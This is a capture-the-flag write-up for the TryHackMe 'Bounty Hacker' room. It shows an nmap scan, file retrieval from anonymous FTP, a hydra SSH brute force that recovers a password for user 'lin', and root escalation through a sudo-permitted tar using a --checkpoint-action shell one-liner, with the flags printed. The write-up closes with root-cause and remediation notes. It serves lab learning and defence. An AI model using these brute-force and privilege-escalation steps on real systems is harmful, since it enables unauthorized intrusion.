# Bounty Hacker — CTF Writeup

**Platform:** TryHackMe
**Room:** [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
**Category:** Linux
**Difficulty:** Easy
**Date:** 2026-10-20

## Overview

A classic Linux boot2root-style room: anonymous FTP access leaks a task
list and a wordlist of password-like strings, which turns out to be an
SSH password list for a named user. From there, a sudo misconfiguration
on `/bin/tar` is abused via GTFOBins to escalate straight to root.

**Final result:** Root shell via SSH credential brute-forcing + a
`sudo`-abusable `tar` binary.

![Target webpage](./images/bounty-hacker-webpage.png)

---

## 1. Reconnaissance

### Port/service scan

```
nmap -sC -sV 10.48.135.203
```

| Port  | Service | Version                                     |
|-------|---------|----------------------------------------------|
| 21/tcp| ftp     | vsftpd 3.0.5 — Anonymous login allowed        |
| 22/tcp| ssh     | OpenSSH 8.2p1 (Ubuntu 4ubuntu0.13, Ubuntu)    |
| 80/tcp| http    | Apache httpd 2.4.41 (Ubuntu)                  |

The FTP service explicitly allowed anonymous login (`230` response),
but directory listing failed outright with `550 Permission denied`.

---

## 2. Enumeration

### Port 80 — HTTP

The web root returned no title and no useful hints in the page source.
**Dead end** on its own, but confirmed as a standard Apache default
setup.

### Port 21 — FTP (anonymous)

```
ftp 10.48.135.203
Name: Anonymous
230 Login successful.
```

Standard `ls` / `dir` both failed:

```
ftp> ls
550 Permission denied.
500 Illegal PORT command.
ftp> dir
500 Illegal PORT command.
```

`PORT`/`PASV` negotiation was broken, so active/passive listings
wouldn't work. Worked around it using the raw `STAT` command on the
root directory to get a listing without needing a data connection:

```
ftp> quote STAT /
213-Status follows:
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
213 End of status
```

`GET` inside the FTP client also failed due to the same PASV issue, so
the files were pulled directly with `curl`'s FTP support instead:

```
curl -O ftp://anonymous:@10.48.135.203/locks.txt
curl -O ftp://anonymous:@10.48.135.203/task.txt
```

**`task.txt`:**

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

The signature (`-lin`) identifies the author of the task list and
answers "who wrote the task list?" → **`lin`**.

**`locks.txt`:** a list of ~26 similar-looking strings (variations on
"Red Dragon Syndicate") — clearly password candidates rather than real
content, and a strong signal to pair with the one named user (`lin`)
found above, against the one other credential-auth service on the box
(SSH, port 22).

---

## 3. Initial Access / Exploitation

Brute-forced SSH using the username recovered from `task.txt` (`lin`)
against the password candidates in `locks.txt`:

```
hydra -l lin -P locks.txt -t 4 10.48.135.203 ssh
```

```
[22][ssh] host: 10.48.135.203   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Logged in over SSH with the recovered credentials:

```
ssh lin@10.48.135.203
```

### Verification

```
lin@ip-10-48-135-203:~/Desktop$ ls
user.txt
lin@ip-10-48-135-203:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

---

## 4. Privilege Escalation

Checked what `lin` could run with elevated privileges:

```
sudo -l
```

```
User lin may run the following commands on ip-10-48-135-203:
    (root) /bin/tar
```

`tar` is a known GTFOBins sudo-escalation vector — its
`--checkpoint-action` option can be abused to execute an arbitrary
command during a checkpoint, spawning a root shell:

```
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
# whoami
root
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

---

## 5. Root Cause

- Anonymous FTP access exposed an internal task list and a credential
  wordlist that were never meant to be publicly reachable.
- A single named user (`lin`) reused one of a small set of
  variant passwords, making SSH brute-forcing with a tiny, targeted
  wordlist trivial.
- `lin` was granted passwordless `sudo` access to `/bin/tar`, a
  binary with a well-documented GTFOBins privilege-escalation
  primitive — any sudo rule on a binary capable of spawning a shell
  is effectively full root access.

## 6. Remediation

- Disable anonymous FTP access, or restrict it to genuinely public,
  non-sensitive files only.
- Never store credentials or credential-adjacent material (wordlists,
  password hints) in a world-readable location.
- Enforce strong, unique passwords and avoid minor variations of a
  single base password/phrase.
- Remove unnecessary `sudo` entries; if a user genuinely needs `tar`
  via sudo, restrict usage tightly (e.g. via wrapper scripts or
  disabling dangerous flags) rather than granting the full binary.

---

## Tools Used

`nmap`, `ftp`, `curl`, `hydra`, `ssh`, GTFOBins
